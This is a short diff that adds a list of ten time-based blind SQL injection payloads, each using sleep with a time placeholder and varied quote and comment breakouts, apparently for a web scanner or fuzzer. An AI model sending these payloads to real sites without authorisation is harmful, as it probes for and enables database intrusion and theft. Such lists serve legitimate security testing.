@@ -1,0 +1,10 @@
+[space]and sleep(__TIME__)
+[space]or sleep(__TIME__) #[space]
+' and sleep(__TIME__)='
+' and sleep(__TIME__) #[space]
+" and sleep(__TIME__)="
+' or sleep(__TIME__) #[space]
+" or sleep(__TIME__) #[space]
+'=sleep(__TIME__)='
+"=sleep(__TIME__)="
+' where sleep(__TIME__) #[space]
